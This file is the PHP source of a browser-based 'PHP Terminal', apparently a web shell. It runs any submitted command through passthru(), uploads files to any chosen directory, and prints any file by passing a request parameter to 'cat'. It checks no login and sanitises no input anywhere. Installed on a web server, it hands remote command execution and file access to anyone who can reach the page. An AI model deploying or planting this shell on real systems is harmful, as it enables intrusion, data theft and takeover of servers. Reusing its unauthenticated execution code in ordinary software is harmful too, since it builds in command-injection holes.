
  if (isset($_POST['command'])) {
    if (explode(" ", $_POST['command'])[0] == "upload") {
      $uploadfile = explode(" ", $_POST['command'])[1] . basename($_FILES['userfile']['name']);
      echo "<span style=\"color: white\">";
      if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
        echo "File was successfully uploaded to " . explode(" ", $_POST['command'])[1] . basename($_FILES['userfile']['name']) . ".";
      } else {
        echo "File failed to upload to " . explode(" ", $_POST['command'])[1] . basename($_FILES['userfile']['name']) . ".";
      }
      echo "</span><p>";
      exit;
    } else {
      if (!isset($_POST['noprompt'])) {
        echo "<span style=\"color: white\">" . exec("whoami") . ':' . exec("pwd") . '$</span> ' . htmlspecialchars($_POST['command']) . '<p>';
      }
      echo htmlspecialchars(passthru($_POST['command'] . ' 2>&1'));
      exit;
    }
  } else if (isset($_REQUEST['file'])) {
    if ($_REQUEST['file'] == '/phpinfo') {
      echo phpinfo();
    }
    header("Content-Type:text/plain");
    echo htmlspecialchars(passthru('cat ' . $_REQUEST['file'] . ' 2>&1'));
    exit;
  }

echo <<<EOL
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Terminal</title>
   <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script> 
  <link rel="stylesheet" type="text/css" href="http://meyerweb.com/eric/tools/css/reset/reset.css">
  <style type="text/css">
    header, section, footer, aside, nav, article, figure, audio, video, canvas  { display:block; }

    body {
      background: #333;
    }

    #wrapper {
      width: 800px;
      margin: 0 auto;
      padding: 20px 0;
    }

    legend {
      padding: 0 0 20px 0;
      color: #CCC;
      font-size: 20px;
      text-align: center;
    }

    fieldset {
      background: black;
    }

    #terminal-wrapper {
      height: 400px;
      position: relative;
      overflow-x: hidden;
    }

    #terminal {
      color: #2ecc71;
      font-weight: bold;
      width: 800px;
      display: block;
      unicode-bidi: embed;
      font-family: monospace;
      white-space: pre;
      line-height: 150%;
      background: black;
      padding: 10px;
      position: absolute;
      bottom: 0;
    }

    #input {
      border: none;
      padding: 10px;
      color: #2ecc71;
      width: 740px;
      font-size: 16px;
      background: black;
      outline: none;
    }

    #label {
      color: #2ecc71;
      float: left;
      padding: 13px 0 10px 10px;
    }

    #upload-file {
      padding: 10px;
      color: white;
      width: 800px;
    }
  </style>
</head>
<body>
  <div id="wrapper">
    <header>
    </header>
    <nav>
    </nav>
    <section id="content">
      <form enctype="multipart/form-data" method="POST">
        <legend>PHP Terminal</legend>
        <fieldset>
          <div id="terminal-wrapper"><p id="terminal">
             ===================================================================================
                                          <span style="color: white;">Welcome to the PHP terminal!</span>

              <span style="color: white;">The following are custom commands:</span>
              <span style="color: white;">history</span> - Displays commands executed.
              <span style="color: white;">clear</span> - Clears the console.
              <span style="color: white;">help</span> - Displays this message.
              <span style="color: white;">open &lt;file&gt;</span> - Opens file in new window. Displayed as plain text.
              <span style="color: white;">open /phpinfo</span> - Displays phpinfo() instead of file in new window.
              <span style="color: white;">upload &lt;dir&gt;</span> - Uploads attached file to directory. Ex: upload /tmp/
              <span style="color: white;">less &lt;command&gt;</span> - q to quit, space to page down. Ex: less cat index.php
              <span style="color: white;">lessl &lt;command&gt;</span> - less with line numbers. Ex: lessl cat index.php
             ===================================================================================

</p></div>
          <p id="label" for="input"> &gt; </p>
          <input type="text" id="input" name="command" autocomplete="off">
          <input name="userfile" id="upload-file" type="file">
        </fieldset>
      </form>
    </section>
    <footer>
    </footer>
  </div>
  <script>
    // Set cursor on into input.
    $("#input").focus();

    // Keep track of commands
    ran_commands = [];
    var current_command = -1;

    // For less
    var lessActive = false;
    var lessl = false
    var topCount = 0;
    var bottomCount = 20;
    var lessOutput = ""
    var lessLines = ""
    var lessOldTerminal = ""

    // Displays the initial #terminal text.
    var help = $("#terminal").html()

    // Run this when you press enter
    $("form").submit(function(event) {
      event.preventDefault();
      ran_commands.push($("#input").val())
      current_command = ran_commands.length - 1;

      if ($("#input").val().split(' ')[0] === "less" || $("#input").val().split(' ')[0] === "lessl" ) {
        lessOutput = ""
        lessOldTerminal = $("#terminal").html()
        lessActive = true;

        if ($("#input").val().split(' ')[0] === "lessl") {
          lessl = true;
        } else {
          lessl = false;
        }

        $("#input").val($("#input").val().substring($("#input").val().indexOf(" ") + 1));

        $.ajax({
           type: "POST",

           url: window.location.href ,
           data: $("#input").serialize() + '&noprompt=1',
           success: function(data) {
              $("#input").val();

              lessOutput = data
              lessLines = lessOutput.split('\\n');

              $("#label").html(" : ")

              topCount = 0;
              bottomCount = 20;
              
              lessDisplay()
           }
        });
      } else if ($("#input").val().split(' ')[0] === "upload") {
        $.ajax({
           type: "POST",
           url: window.location.href,
           data: new FormData($('form')[0]),
           cache: false,
           contentType: false,
           processData: false,
           success: function(data) {
              $("#input").val("");
              $("#upload-file").val("");
              append(data);
           }
        });
      } else if ($("#input").val().split(' ')[0] === "open") {
        var win = window.open(
          window.location.href + '?file=' + $("#input").val().split(' ')[1],
          '_blank'
        );
        if(win){
          //Browser has allowed it to be opened
          win.focus();
        }
        $("#input").val("");
      } else if ($("#input").val() === "help") {
        $("#input").val("");
        append(help);
      } else if ($("#input").val() === "history") {
        $("#input").val("");
        append("<span style=\"color: white\">Command history:</span> " + ran_commands.join(', ') + "<p>");
      } else if ($("#input").val() === "clear") {
        $("#terminal").html("");
        $("#input").val("");
      } else {
        $.ajax({
           type: "POST",
           url: window.location.href,
           data: $("#input").serialize(),
           success: function(data) {
              $("#input").val("");
              append(data);
           }
        });
      }
    });

    function lessDisplay() {
      $("#terminal").html('');

      for (i = topCount; i < lessLines.length && i < bottomCount; i++) {
        if (lessl) {
            $("#terminal").append("<span style=\"color: white;\">" + pad(i + 1, lessLines.length.toString().length) + '.</span> ');
          }
        $("#terminal").append(escapeHtml(lessLines[i]) + '\\n')
      }
    }

    function append(text) {
      var lines = text.split("\\n");

      var time = 0;
      $(lines).each(function(i) {
          setTimeout(function(){
              $("#terminal").append(lines[i] + '\\n');
          }, time);
          time += 20;
      });
    }

    function pad (str, max) {
      str = str.toString();
      return str.length < max ? pad(" " + str, max) : str;
    }

    document.onkeydown = checkKey;

    function checkKey(e) {
      e = e || window.event;

      // Key up
      if (e.keyCode == '38') {
        if (lessActive) {
          e.preventDefault()
          if (topCount > -1) {
            lessDisplay()
            topCount--;
            bottomCount--;
          }
        } else {
          if (current_command > -1) {
            $("#input").val(ran_commands[current_command])
            current_command--;
          }
        }
      // Key down
      } else if (e.keyCode == '40') {
        if (lessActive) {
          e.preventDefault()
          if (topCount < lessLines.length - 21) {
            topCount++;
            bottomCount++;
            lessDisplay()
          }
        } else {
          if (current_command < ran_commands.length) {
            current_command++;
            $("#input").val(ran_commands[current_command])
          }
        }
      // Key Q
      } else if (e.keyCode == '81') {
        if (lessActive) {
          e.preventDefault()
          lessActive = false;
          $("#input").val('');
          $("#label").html(" &gt; ")
          $("#terminal").html(lessOldTerminal);
        }
      // Key space
      } else if (e.keyCode == '32') {
        if (lessActive) {
          e.preventDefault()
          if (topCount < lessLines.length - 41) {
            topCount += 20;
            bottomCount += 20;
            lessDisplay()
          } else if (topCount < lessLines.length - 21) {
            topCount = lessLines.length - 21;
            bottomCount = lessLines.length - 1;
            lessDisplay()
          }
        }
      }
    }

    // Run this on initial load of the page.
    $.ajax({
         type: "POST",
         url: window.location.href,
         data: 'command=whoami',
         success: function(data) {
            $("#input").val("");
            append(data);
         }
    });

    var entityMap = {
      "&": "&amp;",
      "<": "&lt;",
      ">": "&gt;",
      '"': '&quot;',
      "'": '&#39;',
      "/": '&#x2F;'
    };

    function escapeHtml(string) {
      return String(string).replace(/[&<>"'\/]/g, function (s) {
        return entityMap[s];
      });
    }
  </script>
</body>
</html>
EOL;
